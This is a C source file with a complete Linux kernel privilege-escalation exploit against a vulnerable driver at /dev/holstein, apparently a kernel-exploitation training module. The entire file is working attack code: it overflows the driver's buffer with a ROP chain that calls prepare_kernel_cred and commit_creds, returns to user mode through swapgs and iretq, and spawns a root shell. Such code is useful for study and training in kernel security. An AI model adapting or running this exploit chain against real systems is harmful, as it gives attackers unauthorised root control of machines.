#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

uintptr_t prepare_kernel_cred	= 0xffffffff8106e240;
uintptr_t commit_creds		= 0xffffffff8106e390;

uintptr_t pop_rdi_xor_al_0_ret	= 0xffffffff812abdfd;
uintptr_t pop_rcx_xor_al_0_ret	= 0xffffffff812ac83f;
uintptr_t mov_rdi_rax_rep_movsq	= 0xffffffff8160c96b;
uintptr_t swapgs_ret		= 0xffffffff8160bfac;
uintptr_t add_al_ch_iretq	= 0xffffffff811f56c2;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

int main(void)
{
	uint8_t data[0x500] = { 0 };
	uintptr_t *rop_chain;
	int fd;

	save_state();

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	rop_chain = (uintptr_t *)&data[0x408];
	*rop_chain++ = pop_rdi_xor_al_0_ret;
	*rop_chain++ = (uintptr_t)NULL;
	*rop_chain++ = prepare_kernel_cred;
	*rop_chain++ = pop_rcx_xor_al_0_ret;
	*rop_chain++ = 0;
	*rop_chain++ = mov_rdi_rax_rep_movsq;
	*rop_chain++ = commit_creds;
	*rop_chain++ = swapgs_ret;
	*rop_chain++ = add_al_ch_iretq;
	*rop_chain++ = (uintptr_t)shell;
	*rop_chain++ = cs;
	*rop_chain++ = rflags;
	*rop_chain++ = rsp;
	*rop_chain++ = ss;
	write(fd, data, (uintptr_t)rop_chain - (uintptr_t)data);

	close(fd);
	return EXIT_SUCCESS;
}
